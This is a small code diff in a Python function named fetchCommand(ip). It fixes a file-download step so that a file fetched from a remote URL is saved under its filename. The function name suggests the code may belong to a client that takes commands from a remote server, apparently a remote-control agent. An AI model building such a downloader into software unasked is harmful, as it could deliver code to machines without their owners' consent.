@@ -108,7 +108,7 @@ def fetchCommand(ip):
 
                 download_url = URL + '/download/' + filename
                 myFile = requests.get(download_url)
-                open(destination_path+myFile,'wb').write(myFile.content)
+                open(destination_path+filename,'wb').write(myFile.content)
 
             except Exception as e:
                 return "[DEBUG] File Download Failed." + str(e) 
